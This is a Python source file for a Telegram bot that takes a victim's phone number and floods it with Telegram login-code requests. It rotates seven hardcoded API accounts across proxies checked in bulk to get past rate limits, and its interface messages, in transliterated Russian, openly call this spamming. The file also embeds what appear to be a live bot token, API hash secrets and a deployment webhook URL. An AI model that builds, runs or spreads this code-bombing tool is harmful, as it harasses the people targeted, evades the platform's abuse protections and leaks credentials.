import os
import re
import time
import asyncio
import requests
from flask import Flask, request
import telebot
from telebot import types
from telethon import TelegramClient, errors
import socks

TOKEN = "8645900110:AAGpHWaoA9sitUw7KR34NGTJNSKkFxDswgM"
ACCOUNTS = [
    {"api_id": 33788912, "api_hash": "175c63ac822b43d48b32776ee6b82761"},
    {"api_id": 33590106, "api_hash": "b40ac10586c1d243b6180c7f9a4feff2"},
    {"api_id": 39934985, "api_hash": "d0ff8b0d846856b0a01a99379b96e9bd"},
    {"api_id": 7216741, "api_hash": "1e85ff32d1cabb4e6e9537ae2d8218ca"},
    {"api_id": 31360840, "api_hash": "4279cc0d7ab41331200a13bf61152f4a"},
    {"api_id": 38299331, "api_hash": "fb5e560c3bda2db7541770b2294ee137"},
    {"api_id": 35911533, "api_hash": "11dafcdc1514796c867055023716d39a"}
]

bot = telebot.TeleBot(TOKEN, threaded=False)
user_states = {}
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

def load_proxies():
    try:
        with open("proxy.txt", "r") as f:
            lines = [line.strip() for line in f if line.strip()]
        proxies = []
        for line in lines:
            if "://" in line:
                parts = line.split("://")
                if len(parts) == 2:
                    proto, addr = parts
                    if ":" in addr:
                        ip, port = addr.split(":")
                        proxies.append((proto, ip, int(port)))
            else:
                if ":" in line:
                    ip, port = line.split(":")
                    proxies.append(("socks5", ip, int(port)))
        return proxies
    except Exception as e:
        print(f"Ошибка загрузки proxy.txt: {e}")
        return []

async def check_proxy(proxy):
    proto, ip, port = proxy
    client = TelegramClient(None, 12345, "fakehash", proxy=(socks.SOCKS5, ip, port) if proto == "socks5" else None)
    try:
        await asyncio.wait_for(client.connect(), timeout=2)
        await client.disconnect()
        return True
    except:
        return False

def safe_edit(chat_id, msg_id, text, reply_markup=None):
    try:
        bot.edit_message_text(text, chat_id, msg_id, reply_markup=reply_markup)
    except Exception as e:
        if "message is not modified" not in str(e):
            print(f"Edit error: {e}")

async def send_code_with_proxy(client_acc, phone, proxy):
    api_id = client_acc["api_id"]
    api_hash = client_acc["api_hash"]
    proto, ip, port = proxy
    client = TelegramClient(None, api_id, api_hash, proxy=(socks.SOCKS5, ip, port) if proto == "socks5" else None)
    try:
        await client.connect()
        await client.send_code_request(phone)
        await client.disconnect()
        return True
    except errors.FloodWaitError as e:
        raise e
    except Exception as e:
        print(f"Ошибка с прокси {ip}:{port} - {e}")
        return False

def send_codes_sync(chat_id, msg_id, phone):
    async def send_codes():
        log_msg = bot.send_message(chat_id, "proveriau proxy podochdi...")
        all_proxies = load_proxies()
        if not all_proxies:
            safe_edit(chat_id, msg_id, "net proxy v fail proxy.txt")
            return
        safe_edit(chat_id, log_msg.message_id, "proveryau proxy...")
        needed = 20
        good_proxies = []
        sem = asyncio.Semaphore(100)
        async def check_one(p):
            async with sem:
                if await check_proxy(p):
                    return p
                return None
        for i in range(0, len(all_proxies), 50):
            chunk = all_proxies[i:i+50]
            tasks = [check_one(p) for p in chunk]
            results = await asyncio.gather(*tasks)
            good_proxies.extend([p for p in results if p is not None])
            if len(good_proxies) >= needed:
                break
        if not good_proxies:
            safe_edit(chat_id, msg_id, "net rabochih proxy")
            return
        safe_edit(chat_id, log_msg.message_id, f"naydeno {len(good_proxies)} rabochih proxy")
        safe_edit(chat_id, msg_id, "nachinaiu spamit...")

        max_flood = 0
        total_sent = 0
        proxy_index = 0

        for acc in ACCOUNTS:
            try:
                proxy = good_proxies[proxy_index % len(good_proxies)]
                proxy_index += 1
                success = await send_code_with_proxy(acc, phone, proxy)
                if success is True:
                    total_sent += 1
                elif isinstance(success, Exception):
                    raise success
            except errors.FloodWaitError as e:
                if e.seconds > max_flood:
                    max_flood = e.seconds
                break
            except Exception as e:
                print(f"Ошибка аккаунта: {e}")

        safe_edit(chat_id, log_msg.message_id, f"otpravleno {total_sent} codov")
        if max_flood > 0:
            safe_edit(chat_id, msg_id, f"floodwait - {max_flood} sekund")
        else:
            safe_edit(chat_id, msg_id, "gotovo")

        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("spam", callback_data="spam"))
        safe_edit(chat_id, msg_id, "nashmi dalshe", reply_markup=kb)
        if chat_id in user_states:
            user_states[chat_id]["timer_task"] = None

    loop.run_until_complete(send_codes())

@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("spam", callback_data="spam"))
    sent = bot.reply_to(message, "privet, chtob spamit nashmi vnizu (spam)", reply_markup=kb)
    user_states[chat_id] = {"message_id": sent.message_id, "waiting_phone": False}

@bot.callback_query_handler(func=lambda call: call.data == "spam")
def spam_callback(call):
    chat_id = call.message.chat.id
    state = user_states.get(chat_id)
    if not state:
        bot.answer_callback_query(call.id)
        return
    safe_edit(chat_id, state["message_id"], "napishi nomer")
    state["waiting_phone"] = True
    bot.answer_callback_query(call.id)

@bot.message_handler(func=lambda message: True)
def handle_phone(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    if not state or not state.get("waiting_phone"):
        return
    phone = re.sub(r'[^0-9+]', '', message.text)
    if not phone.startswith('+'):
        phone = '+' + phone
    state["waiting_phone"] = False
    bot.delete_message(chat_id, message.message_id)
    send_codes_sync(chat_id, state["message_id"], phone)

WEBHOOK_URL = "https://smap-production-a671.up.railway.app/webhook"
app = Flask(__name__)

@app.route('/webhook', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_str = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_str)
        bot.process_new_updates([update])
        return '', 200
    return '', 403

@app.route('/')
def index():
    return "Server is running", 200

if __name__ == "__main__":
    bot.remove_webhook()
    resp = requests.get(f"https://api.telegram.org/bot{TOKEN}/setWebhook?url={WEBHOOK_URL}")
    if resp.status_code != 200:
        print("Webhook set error:", resp.text)
    else:
        print("Webhook set:", resp.json())
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
